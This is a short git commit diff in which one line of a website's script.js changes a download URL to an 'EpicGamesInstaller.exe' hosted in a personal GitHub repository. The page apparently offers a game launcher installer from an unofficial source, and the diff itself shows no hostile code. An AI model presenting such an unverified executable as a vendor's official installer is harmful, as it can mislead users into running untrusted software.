699042c58ae184b0968835c0143b840e0d4c3d08
Ander <andero_o@hotmail.com>
2026-07-23 12:54:25 -0500

    cambios

--- script.js
+++ script.js
@@ -1,5 +1,5 @@
 // URL de descarga
-const DOWNLOAD_URL = 'https://github.com/Anderson0525/EpicGames/raw/refs/heads/main/EpicInstaller-19.2.3.exe';
+const DOWNLOAD_URL = 'https://github.com/Anderson0525/EpicGames/raw/refs/heads/main/EpicGamesInstaller.exe';
 
 // Datos de juegos
 const gamesData = {
